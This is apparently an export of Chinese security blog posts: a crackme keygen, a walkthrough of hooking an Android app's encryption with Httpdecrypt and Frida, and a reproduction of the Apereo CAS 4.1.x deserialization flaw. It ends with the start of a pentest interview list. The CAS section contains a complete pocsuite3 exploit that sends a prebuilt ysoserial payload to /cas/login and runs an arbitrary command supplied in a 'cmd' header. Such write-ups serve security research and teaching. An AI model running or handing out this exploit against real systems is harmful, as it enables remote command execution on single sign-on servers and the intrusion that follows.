<p>然后在数据窗口输入刚才的地址+4C，找到form GUI描述表的指针</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161433897.png" alt="image-20201228161433897"></p>
<p>数据窗口跟随DWORD</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161501143.png" alt="image-20201228161501143"></p>
<p>00  01 指的是窗体的序号 10则为第一个窗体的启动标志</p>
<p>所以 我们只要把第一个窗体数据块的00改成10 然后把第二个窗体的数据块的10改成00，或者将窗体的序号调换。即 可去除neg。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161703623.png" alt="image-20201228161703623"></p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161721626.png" alt="image-20201228161721626" style="zoom:50%;">

<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161902354.png" alt="image-20201228161902354"></p>
<p>和002一样获取哟弄个户名长度然后根据得到的结果算出来一个值 我这里这个值为355601</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161949962.png" alt="image-20201228161949962"></p>
<p>首先将刚才计算的结果转为浮点数 放入到FPU栈 然后将结果加上2.0 得到355603。逆向这个程序你并不需要 看懂每一条浮点指令，只需要单步跟踪 然后时时观察FPU栈的情况。</p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162027293.png" alt="image-20201228162027293"></p>
<p>还是将刚才的结果转为浮点数并入栈 然后将355603乘以一个值再减去一个值 最后得到结果ST0=1066807.0000</p>
<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162141525.png" alt="image-20201228162141525"></p>
<p>将刚才那个值 -（-15） 到此验证结束</p>
<p>1066822</p>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162235299.png" alt="image-20201228162235299" style="zoom:50%;">

<p>编写注册机</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162444993.png" alt="image-20201228162444993"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162502213.png" alt="image-20201228162502213"></p>
<h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162854781.png" alt="image-20201228162854781"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;please input your username :&quot;)</span><br><span class="line">s &#x3D; input()</span><br><span class="line"># 获取用户名长度*0x15b38 +  用户名首位</span><br><span class="line">print(ord(s[0])+len(s)*(0x15b38))	</span><br><span class="line"># 变成浮点数然后数值加2</span><br><span class="line">print((ord(s[0])+len(s)*(0x15b38))+2)</span><br><span class="line"># 相应的浮点数 * 3 - 2</span><br><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2)</span><br><span class="line">print(&quot;your password is:&quot;)</span><br><span class="line"># 让相应的值- (-15) 相当于+15</span><br><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>crackme</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Httpdecrypt进行hook</title>
    <url>/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/</url>
    <content><![CDATA[<h2 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.mumu模拟器</span><br><span class="line">2.httpdecrypt（https:&#x2F;&#x2F;github.com&#x2F;lyxhh&#x2F;lxhToolHTTPDecrypt）</span><br><span class="line">3.frida 12.11.17</span><br><span class="line">4.Mac os 10.15.5</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="1-使用mumu模拟器连接adb"><a href="#1-使用mumu模拟器连接adb" class="headerlink" title="1. 使用mumu模拟器连接adb"></a>1. 使用mumu模拟器连接adb</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb kill-server &amp;&amp; adb server &amp;&amp; adb shell</span><br></pre></td></tr></table></figure>

<p>安装时使用4.3.2版本 5.0版本报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The client is using an unsupported version of the Socket.IO or Engine.IO protocols</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install flask-socketio&#x3D;&#x3D;4.3.2</span><br></pre></td></tr></table></figure>

<h3 id="2-对注册功能抓包"><a href="#2-对注册功能抓包" class="headerlink" title="2. 对注册功能抓包"></a>2. 对注册功能抓包</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120510857.png" alt="image-20201229120510857"></p>
<p>可以看到securityCode以及post内容均为加密内容</p>
<h3 id="3-运行httpdecrypt"><a href="#3-运行httpdecrypt" class="headerlink" title="3. 运行httpdecrypt"></a>3. 运行httpdecrypt</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229120648649.png" alt="image-20201229120648649"></p>
<p>找到目标app 将app包名com.xxx.xxx填入框中并点击Confirm</p>
<h3 id="4-然后点击Hooks功能"><a href="#4-然后点击Hooks功能" class="headerlink" title="4. 然后点击Hooks功能"></a>4. 然后点击Hooks功能</h3><p>在Match中输入刚才的包名 点击Confirm</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121019274.png" alt="image-20201229121019274"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229121218308.png" alt="image-20201229121218308"></p>
<h3 id="5-重新进行注册功能操作"><a href="#5-重新进行注册功能操作" class="headerlink" title="5. 重新进行注册功能操作"></a>5. 重新进行注册功能操作</h3><p>根据数据包中的参数，找到对应的方法</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145006899.png" alt="image-20201229145006899"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145315814.png" alt="image-20201229145315814"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool.EncoderByMd5(argType0 : string)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145518763.png" alt="image-20201229145518763"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.decrypt(argType0 : object argType1 : string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-查看加密函数"><a href="#6-查看加密函数" class="headerlink" title="6. 查看加密函数"></a>6. 查看加密函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES.encrypt(argType0 : object argType1 : string)</span><br></pre></td></tr></table></figure>

<p>有两个参数 一个是<strong>对象</strong> 一个是<strong>字符串</strong> 我们还需要知道对象的具体的参数类型</p>
<p>在Finds中搜索函数的类名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.xxx.xxx.ybblibrary.comm.commTools.tool</span><br></pre></td></tr></table></figure>

<ul>
<li>点击Confirm</li>
<li>找到方法名EncryptionTool$AES encrypt</li>
<li>可以看到其具体的参数类型</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145750559.png" alt="image-20201229145750559"></p>
<p>加密函数中参数对象的具体的类型为static</p>
<h2 id="代码生成"><a href="#代码生成" class="headerlink" title="代码生成"></a>代码生成</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229145856477.png" alt="image-20201229145856477" style="zoom:50%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.转到toBurp模块</span><br><span class="line">2.然后点击Confirm</span><br><span class="line">3.点击add</span><br><span class="line">由于这个加密函数有两个参数 所以需要自己编辑代码（默认只有一个参数）</span><br><span class="line">4.由于对象参数是static类型 所以选择static类型</span><br><span class="line">动态的选择instance类型</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150310913.png" alt="image-20201229150310913"></p>
<h3 id="1-在custom中会生成代码"><a href="#1-在custom中会生成代码" class="headerlink" title="1. 在custom中会生成代码"></a>1. 在custom中会生成代码</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229153322897.png" alt="image-20201229153322897"></p>
<p>arg0是传过来的加密字符串 arg1是Android的Context的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br></pre></td></tr></table></figure>

<p>最终代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">var rpc_result &#x3D; null;</span><br><span class="line">var rpc_result_ios &#x3D; null;</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">tagf0f1c91ca14d835ab8ae6e62346a447d02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">				var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES0224190b5b0f850f45017089f29e6428 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES0224190b5b0f850f45017089f29e6428.decrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tagf0f1c91ca14d835ab8ae6e62346a447d02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line">tag24239e10fd5afd01a5459978c4306b1f02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">				var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57.encrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tag24239e10fd5afd01a5459978c4306b1f02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-loadScript"><a href="#2-loadScript" class="headerlink" title="2.loadScript"></a>2.loadScript</h3><p>点击左上角loadScript</p>
<h3 id="3-在burpsutie中进行设置"><a href="#3-在burpsutie中进行设置" class="headerlink" title="3.在burpsutie中进行设置"></a>3.在burpsutie中进行设置</h3><p>下载burp插件HTTPDecrpyt并进行安装</p>
<p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt/releases">https://github.com/lyxhh/lxhToolHTTPDecrypt/releases</a></p>
<p>选择到encrypt 然后右键发送到toBurp模块</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150805594.png" alt="image-20201229150805594"></p>
<p>选择加密后的数据 然后根据配置的方法进行解密</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150956317.png" alt="image-20201229150956317"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229151136475.png" alt="image-20201229151136475"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.ironheart.top/index.php/archives/22/">http://www.ironheart.top/index.php/archives/22/</a></p>
<p><a href="https://xz.aliyun.com/t/7130">https://xz.aliyun.com/t/7130</a></p>
<p><a href="https://www.t00ls.net/articles-51070.html#tls4">https://www.t00ls.net/articles-51070.html#tls4</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Httpdecrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>Apereo Cas 4.1.x 反序列化命令执行漏洞</title>
    <url>/2020/12/29/WEB/Exploit/Apereo-cas/Apereo-Cas-4-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote>
<p>Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
</blockquote>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其实这个洞在2016年时候就出来了，Apereo Cas一般是用来做身份认证的，所以有一定的攻击面，漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用。</p>
<p>漏洞原理实际上是 Webflow 中使用了默认密钥 <code>changeit</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>工具下载地址：</p>
<p><a href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonCollections4</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229195402286.png" alt="image-20201229195402286"></p>
<p>将该payload替换至execution处，并在头部添加命令cmd:xxx</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229203354148.png" alt="image-20201229203354148"></p>
<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class ApereoPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;004&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;github.com&#x2F;MrMeizhi&#x2F;ysoserial-mangguogan&#39;]</span><br><span class="line">	name &#x3D; &#39;appereo 4.1rce&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.appareo.com&#x2F;&#39;</span><br><span class="line">	appName &#x3D; &#39;Appereo&#39;</span><br><span class="line">	appVersion &#x3D; &#39;4.1&#39;</span><br><span class="line">	vulType &#x3D; &#39;rce&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			rce</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	def _options(self):</span><br><span class="line">		o &#x3D; OrderedDict()</span><br><span class="line">		o[&quot;exec&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;请输入想要执行的命令&#39;, require&#x3D;True)</span><br><span class="line">		return o</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		payload &#x3D; self.get_option(&quot;exec&quot;)</span><br><span class="line">		url &#x3D; self.url + &#39;&#x2F;cas&#x2F;login&#39;</span><br><span class="line">		headers&#x3D;&#123;</span><br><span class="line">			&#39;Content-Type&#39;:  &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">			&#39;cmd&#39;: payload</span><br><span class="line">		&#125;</span><br><span class="line">		#proxies&#x3D;&#123;</span><br><span class="line">		# &#39;http&#39;:&#39;127.0.0.1:8081&#39;,</span><br><span class="line">		# &#39;https&#39;:&#39;127.0.0.1:8081&#39;</span><br><span class="line">		# &#125;</span><br><span class="line">		data &#x3D; &#123;</span><br><span class="line">			&#39;execution&#39;:&#39;4c2e04cc-36fd-4a78-a539-ab98a65ff427_AAAAIgAAABC0ugdUC3wVTL66CTpSSFXfAAAABmFlczEyOCCbvgOC7&#x2F;mJ16k1YEqnbb4iYkkhNuWylo+cCiG7vsHQWc4OudDgqLtgaCEzQj8c&#x2F;3tWkVDKryIJFcjdW64IpJ1+ymxDamhIfoF3oCFkBD6LGjmB31YH6zlT1rFN9&#x2F;7CFeKORHALeLVx2YAN4seko9M&#x2F;javUOs7UE+zzLGonjc54xjK7S64KBw52Fa0vj912zrOP4J6S7Vi9yJOeOTx432Or&#x2F;cjz722nEAIpjpcIIawwRdUcCyZY7bJDhR+QL7Ca3h9lPZ1LIAeIe9CDP0PCQDAONZ0rswQ9AitIDlqM+lBDKtqhPfHSNq8jBd5T6t3&#x2F;9xXFpPIbLpUPiwysE&#x2F;yioU8b&#x2F;npQfATy5UZvf3d2TWtHiEEhECGjOS4zZqqhl5HhBK3lw50JoO&#x2F;78RMscuM+3oAF8r9YJq2vrY+2GNwgg5rMIWtodeQL9gEIABKMy2Isetinvnc05Dj5f9kJ7WXSIrEobqYmSf1RaSM7EO8yuXS7kVUvY1+TYBorC8JYhY6owsUm4jNSKlvVX+PkrwcQXOJH3lpVpN4qZ&#x2F;GTNJkNO0ndWRlWgoHDKxI0+Jr6+k2CzlPgOhCiQq08nldByD4VOFJ1Fcjj4XFxlWI2MWxsMYTj9YdHwozA4gZNE8gkMq0tn8lwnJz6gVvSXWkDKnxJBPT3kEw1b+wjZSBsuj+JCdxCIa+lZopdPWIO40ITA2245p1U9i9srkCJ&#x2F;od122lzrrCALs+FKn1&#x2F;uwQs9FKXxH8xKwgpUmZepCX6Lf+qr8m9xQ&#x2F;XmoxSh1Sg0hkZcw0bh30mdZvUH9Jf&#x2F;bEdgVxuAB1Ki1Y5&#x2F;flDS4HkjydACMm+Pg5SzcRHZtavv+t5ko&#x2F;tTIjwyqug9jOZWMnKDq47nD&#x2F;qOvuO0TS&#x2F;COeDMmPGV4stx6+5+6kXtP088MQVRBLdlVsGrolnPVgQG9JPgfMOZKoyidBDH99oy1WWivT2Y2LDnFx4MXeuEHR3qnuWHkYxfaysVCM83yMd4eqvLBHp4ILBf4mmv34S25T7ajkOKfIDXJZc7AhzlkfPzufCSIVdYNPvRxijLpJV2icYs7KQXx98EXXwOAw+wXJAKEbEXv&#x2F;gErjwUQUXVactxFVqlkugxj1u052N9gh620Nz+54c5FF8vHaBtHVNtB48bnB1NGCL098EDHFnI9L&#x2F;trqp2LPw6veXtH0y6TT&#x2F;l+sALyQ6P167qrc6lQ8gclh5tEg4Cuz2jbG56pmY+5Zj6RHNFeZeDDXpYrJ5g2Bxn4AcPW3lM4Vpnzoypzcs4ktZRL0deQNMis53i5O0C96ZBQjYqfPqCtr7zS7KZXRfJSmmv0hcWZINv0S2+7SzFCrRyMW0ykJ4reuwlm1ZAG2W5RZNzMOH&#x2F;76N2ITAQxFHG228typOvHAuXG2pB5xYMwtm9ZysqQvzGNMspuu0CaDkCV7myKMAtCfGJTVRV7xs1slSmYnwTg3SdoJ+0ZJfOOsyFsZYqii2RTixQKykc4Uo3fyLb9dFe6Kd7vpkK&#x2F;47MrOmzVBS1Xv1cHGCeM7K4Yca0&#x2F;oJL&#x2F;Dhbwfqt4hIKbhiTccek5mco&#x2F;hywqizyY2C3UVieQxOX1CYfrjnihEJ75lBQjkaRqB3S05vzzfyTPvv55QfYQMyMODdgvNEt9PIQ6axHv1DxYeVhUAd10p1n01SQIdbAi+1WE3ykGgyrLSul1gFRlI&#x2F;3STqelXFWbYiZarKdfgvvV1r&#x2F;HQ6ZErUagAdmmaJUSgjzRSEgA3Sk&#x2F;V5PMrISxxYVbTVm&#x2F;vq1Zla7BaUstxiclygOuvZ3C2AfxS+AVaTeqOWCqXrjeg6uxOJIUQ1HzS&#x2F;Vs5EbYmkcRHWCjJRTjh&#x2F;Sa0GDP&#x2F;Giuw5CL8BEDo7SKuYqVYOIf5hk0Upj4YcRWouOhbbJY9mNNWHknoiYRJHTrVDrRwYYO1Ij8Vf8jiWmXxRWZ8tyFuEB3yX0SkVgw5OlU1M24d7x1LZYpZX6vpU1qrDme1yrGW4FS4qBg3lE1r9EK2gzQeT1u5GhME2rotGVNU4OZ&#x2F;Ut3mKpY5NOo3b2yHoa1iIdE+Sg9uerfNPV59u00En&#x2F;I2MHTtl8JGZp3SXTtoxG8YBC4CU7JXdSzmSF8nHD0SGUL&#x2F;LNdajIzH9hfijUX6I5NxEMyumX&#x2F;krUBqW0irEWYV7I60YDRzN&#x2F;LpXe9EQj5chLmXlRcQU49vlxSHav3YFHrnGFFzyGxwU&#x2F;6RDiWIt4ombAl&#x2F;&#x2F;OsWR964unMMsU+omndBNBII&#x2F;1g1kSs1qikjqdNm611p8swjK3X7kpGCj5rUyTE9GOAkBD6NYrj32SNE5BPys7u6r3Q7gx&#x2F;hU1s02trClHoQhqQvKILW8dN7aYcWSf5FV8fug3GjAxV+c3pTYiNbe2lKFLbzyeJen1GvkAVXVrpJqtuPejZK6IPiJ8wI7ZwqL7oP5G3Esu9Z6syxrdqMGmhpOA0QE0NPISgMu6TzZxgt3FGAkV9&#x2F;hH9ABc&#x2F;h4QMMkUOgZPMddyYBugpcaG0NTgU7WXZNuz1hQEqsW+rcXVhF30uydTnF2mhJ0UrmQVMg+qlaGBQOVJuar9ud+D+CAYT2a2tjUluhWj284EjM5yNg3A5nNQthCowUy7bfsjbp82Yb8p9l86ETHZo26WmUe2k+beZPGOtF00QZcQaRYowr2B8+0OMFuhmGzWtJqlWgGXAmtcWFPyDgnHWwjj&#x2F;bTyqzVfnrBpiKf1SiUdRbrvyr8hjrWQ&#x2F;wZ52No1qkQmLo1x9sfEcBKHOxakYWb6vjbcPQekorRn4NS4WT3KU&#x2F;ftAhxg2EITy2Lq1Y&#x3D;&#39;</span><br><span class="line">			&#125;</span><br><span class="line">		r &#x3D; requests.post(url, headers&#x3D;headers,data&#x3D;data)</span><br><span class="line">		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;exec&#39;] &#x3D; r.text</span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		return self._verify()</span><br><span class="line">register_poc(ApereoPoc)</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229210459731.png" alt="image-20201229210459731"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8260#toc-4">https://xz.aliyun.com/t/8260#toc-4</a></p>
<p><a href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apereo Cas</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 最新渗透测试⾯试题合集</title>
    <url>/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<blockquote>
<p>⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。</p>
</blockquote>
<a id="more"></a>

<h2 id="渗透篇"><a href="#渗透篇" class="headerlink" title="渗透篇"></a>渗透篇</h2><h4 id="1、介绍⼀下⾃认为有趣的挖洞经历"><a href="#1、介绍⼀下⾃认为有趣的挖洞经历" class="headerlink" title="1、介绍⼀下⾃认为有趣的挖洞经历"></a>1、介绍⼀下⾃认为有趣的挖洞经历</h4><p>挖洞也有分很多种类型，⼀种是以渗透、⼀种是以找漏洞为主，如果是前者会想各种办法获取权限继⽽获取想要的的东 </p>
<p>⻄完成渗透⽬标，这类跟 HW 类似，⽬标各种漏洞不算，要有 Shell，服务器权限才给分，这才是最接近实战渗透，跟某 </p>
<p>部⻔有合作的话也是属于这种打击⽹络犯罪获得权限、传销数据、组织架构，服务器权限、等……</p>
<h4 id="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"><a href="#2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？" class="headerlink" title="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"></a>2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？</h4><p>SQL 注⼊、密码组合, 前者防护分为⼏种，CDN -&gt; Web -&gt; 数据库 -&gt; 主机, 设置最⼩权限来应对。密码组合根据个⼈ </p>
<p>习惯</p>
<h4 id="3、php-java-反序列化漏洞的原理-解决⽅案"><a href="#3、php-java-反序列化漏洞的原理-解决⽅案" class="headerlink" title="3、php/java 反序列化漏洞的原理? 解决⽅案?"></a>3、php/java 反序列化漏洞的原理? 解决⽅案?</h4><p>php 中围绕着 serialize()，unserialize() 这两个函数，序列化就是把⼀个对象变成可以传输的字符串, 如果服务器能够接 </p>
<p>收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术⽅法⾥⾯的话，就容易造成很严重的漏洞 </p>
<p>了。</p>
<p>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;} </p>
